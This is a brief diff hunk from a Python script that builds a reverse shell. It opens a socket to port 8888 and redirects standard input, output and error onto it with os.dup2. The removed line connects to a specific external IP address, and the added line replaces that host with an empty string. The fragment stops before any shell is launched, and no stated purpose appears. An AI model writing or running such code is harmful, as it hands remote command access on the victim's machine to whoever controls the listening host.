@@ -3,7 +3,7 @@ import os
 import socket
 
 s = socket.socket()
-s.connect(('162.14.98.73', 8888))
+s.connect(('', 8888))
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
